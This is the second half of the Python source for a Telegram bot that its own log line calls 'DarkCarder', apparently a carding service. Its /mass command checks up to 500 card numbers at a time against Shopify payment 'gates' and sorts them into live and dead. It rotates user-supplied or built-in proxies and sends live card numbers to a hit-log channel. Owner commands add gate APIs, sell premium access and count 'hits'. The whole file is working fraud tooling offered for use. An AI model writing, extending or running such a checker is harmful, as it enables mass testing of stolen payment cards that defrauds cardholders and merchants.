    color = "𝗟𝗜𝗩𝗘" if st == "live" else ("𝗗𝗘𝗔𝗗" if st == "dead" else "𝗘𝗥𝗥𝗢𝗥")
    text = (f"<b>┌── {icon} 𝗥𝗘𝗦𝗨𝗟𝗧 ──┐</b>\n"
            f"<b>├ Card ➛</b> <code>{result.get('card', parts[1])}</code>\n"
            f"<b>├ Status ➛</b> <b>{color}</b>\n"
            f"<b>├ Gate ➛</b> Shopify\n"
            f"<b>├ API ➛</b> {result.get('api_name', '—')}\n"
            f"<b>└ Resp ➛</b> <code>{str(result.get('response', ''))[:120]}</code>\n"
            f"<b>└────────────────┘</b>")
    try: await status_msg.edit_text(text)
    except Exception: await message.reply(text)
    if st == "live":
        try:
            await bot.send_message(HIT_LOGS_ID,
                f"{tg('live','🟢')} <b>LIVE</b> | <code>{result.get('card')}</code> | {message.from_user.mention_html()}")
        except Exception: pass

@router.message(Command("mass"))
async def cmd_mass(message: Message):
    if not await require_premium(message): return
    cards = []
    if message.reply_to_message and message.reply_to_message.text:
        cards = [l.strip() for l in message.reply_to_message.text.splitlines() if l.strip()]
    else:
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            cards = [l.strip() for l in parts[1].replace(",", "\n").splitlines() if l.strip()]
    if not cards:
        await message.reply(f"{tg('fire','🔥')} Reply to card list with <code>/mass</code>\nor <code>/mass card1\\ncard2</code>\nLimit 500 · Sites {len(SITES)}")
        return
    cards = cards[:500]
    proxy = USER_PROXY.get(message.from_user.id)
    MASS_STOP.discard(message.from_user.id)
    progress = await message.reply(
        f"{tg('fire','🔥')} <b>Mass started</b> — {len(cards)} cards\n<code>0 / {len(cards)}</code>",
        reply_markup={"inline_keyboard": [[btn(" 𝗦𝘁𝗼𝗽", f"mass_stop_{message.from_user.id}", emoji_key="stop", style="danger")]]})
    lives, dead_c, err_c = [], 0, 0
    async def on_progress(cur, total, last):
        nonlocal dead_c, err_c
        if message.from_user.id in MASS_STOP: return
        st = last.get("status")
        if st == "live": lives.append(last.get("card"))
        elif st == "dead": dead_c += 1
        else: err_c += 1
        if cur % 5 == 0 or cur == total:
            try:
                await progress.edit_text(
                    f"{tg('fire','🔥')} <b>Running</b>\n<code>{cur}/{total}</code>\n🟢 {len(lives)} | 🔴 {dead_c} | ⚠️ {err_c}",
                    reply_markup={"inline_keyboard": [[btn(" 𝗦𝘁𝗼𝗽", f"mass_stop_{message.from_user.id}", emoji_key="stop", style="danger")]]})
            except Exception: pass
    results = await mass_check(cards, message.from_user.id, proxy, on_progress)
    live_list = [r["card"] for r in results if r.get("status") == "live"]
    dead_c = sum(1 for r in results if r.get("status") == "dead")
    err_c = sum(1 for r in results if r.get("status") not in ("live", "dead"))
    final = (f"<b>┌── {tg('crown','👑')} 𝗠𝗔𝗦𝗦 𝗥𝗘𝗦𝗨𝗟𝗧 ──┐</b>\n"
             f"<b>├ Total ➛ {len(results)}</b>\n"
             f"<b>├ 🟢 Live ➛ {len(live_list)}</b>\n"
             f"<b>├ 🔴 Dead ➛ {dead_c}</b>\n"
             f"<b>├ ⚠️ Err ➛ {err_c}</b>\n"
             f"<b>└──────────────────┘</b>")
    if live_list:
        final += "\n\n<b>Lives:</b>\n<code>" + "\n".join(live_list[:40]) + ("\n..." if len(live_list) > 40 else "") + "</code>"
    try: await progress.edit_text(final)
    except Exception: await message.reply(final)

@router.callback_query(F.data.startswith("mass_stop_"))
async def cb_mass_stop(callback: CallbackQuery):
    uid = int(callback.data.split("_")[-1])
    if callback.from_user.id not in (uid, OWNER_ID):
        await callback.answer("Not your session.", show_alert=True); return
    MASS_STOP.add(uid)
    await callback.answer("Stopping…")
    try: await callback.message.edit_reply_markup(reply_markup=None)
    except Exception: pass

# ── PROXY
@router.message(Command("proxy"))
async def cmd_proxy(message: Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.reply(f"{tg('globe','🌐')} <code>/proxy host:port</code> or user:pass@host:port")
        return
    USER_PROXY[message.from_user.id] = parts[1].strip()
    await message.reply(f"{tg('live','✅')} Proxy set:\n<code>{parts[1].strip()}</code>")

@router.message(Command("checkproxy"))
async def cmd_checkproxy(message: Message):
    p = USER_PROXY.get(message.from_user.id)
    await message.reply(f"{tg('globe','🌐')} Current:\n<code>{p or 'none (using random built-in)'}</code>\nBuilt-in pool: <b>{len(PROXIES)}</b>")

@router.message(Command("clearproxy"))
async def cmd_clearproxy(message: Message):
    USER_PROXY.pop(message.from_user.id, None)
    await message.reply(f"{tg('trash','🗑️')} Proxy cleared — will use random built-in.")

@router.message(Command("randproxy"))
async def cmd_randproxy(message: Message):
    if not PROXIES:
        await message.reply("No built-in proxies.")
        return
    p = random.choice(PROXIES)
    USER_PROXY[message.from_user.id] = p
    await message.reply(f"{tg('globe','🌐')} Random proxy set:\n<code>{p}</code>")

# ── ADMIN
@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != OWNER_ID:
        await message.reply(f"{tg('cross','❌')} Owner only.")
        return
    await message.reply(ADMIN_TEXT, reply_markup=ADMIN_KB)

@router.message(Command("addapi"))
async def cmd_addapi(message: Message):
    if message.from_user.id != OWNER_ID: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].startswith("http"):
        await message.reply("Usage: <code>/addapi https://gate/shopify</code>")
        return
    ok = await add_api(parts[1].strip(), added_by=OWNER_ID)
    await message.reply(f"{tg('live','✅')} Added." if ok else f"{tg('warn','⚠️')} Exists/failed.")

@router.message(Command("prem", "premium"))
async def cmd_prem(message: Message):
    if message.from_user.id != OWNER_ID: return
    parts = message.text.split()
    if len(parts) < 3:
        await message.reply("<code>/prem user_id days</code>")
        return
    try:
        uid, days = int(parts[1]), int(parts[2])
    except ValueError:
        await message.reply("Invalid.")
        return
    await ensure_user(uid)
    await set_premium(uid, days)
    await message.reply(f"{tg('crown','👑')} Premium → <code>{uid}</code> for {days}d")
    try: await bot.send_message(uid, f"{tg('crown','👑')} Premium activated for <b>{days} days</b>!")
    except Exception: pass

@router.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != OWNER_ID: return
    parts = message.text.split()
    if len(parts) < 2: await message.reply("<code>/ban uid</code>"); return
    await ban_user(int(parts[1]), True)
    await message.reply(f"{tg('cross','❌')} Banned <code>{parts[1]}</code>")

@router.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != OWNER_ID: return
    parts = message.text.split()
    if len(parts) < 2: await message.reply("<code>/unban uid</code>"); return
    await ban_user(int(parts[1]), False)
    await message.reply(f"{tg('live','✅')} Unbanned <code>{parts[1]}</code>")

@router.message(Command("broad", "broadcast"))
async def cmd_broad(message: Message):
    if message.from_user.id != OWNER_ID: return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.reply("<code>/broad message</code>")
        return
    await message.reply(f"{tg('announce','📢')} Broadcast queued.\n\n{parts[1]}")

@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if message.from_user.id != OWNER_ID: return
    s = await get_stats()
    await message.reply(
        f"<b>┌── {tg('star','⭐')} 𝗦𝗧𝗔𝗧𝗦 ──┐</b>\n"
        f"<b>├ Users ➛ {s['total_users']}</b>\n"
        f"<b>├ Premium ➛ {s['premium_users']}</b>\n"
        f"<b>├ Hits ➛ {s['total_hits']}</b>\n"
        f"<b>├ Lives ➛ {s['total_lives']}</b>\n"
        f"<b>├ APIs ➛ {s['active_apis']}</b>\n"
        f"<b>├ Sites ➛ {len(SITES)}</b>\n"
        f"<b>├ Proxies ➛ {len(PROXIES)}</b>\n"
        f"<b>└────────────────┘</b>")

@router.message(Command("sites"))
async def cmd_sites(message: Message):
    await message.reply(f"{tg('shopify','🛒')} Embedded Shopify sites: <b>{len(SITES)}</b>\nProxies: <b>{len(PROXIES)}</b>")

@router.message(Command("eid"))
async def cmd_eid(message: Message):
    if not message.entities:
        await message.reply("Send /eid + a premium custom emoji")
        return
    for ent in message.entities:
        if ent.type == "custom_emoji":
            await message.reply(f"ID: <code>{ent.custom_emoji_id}</code>")
            return
    await message.reply("No custom emoji found.")

# ── MAIN
async def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("=" * 50)
        print("  Set BOT_TOKEN in this file first!")
        print("=" * 50)
        return
    await init_db()
    log.info(f"⚡ DarkCarder online | sites={len(SITES)} proxies={len(PROXIES)}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
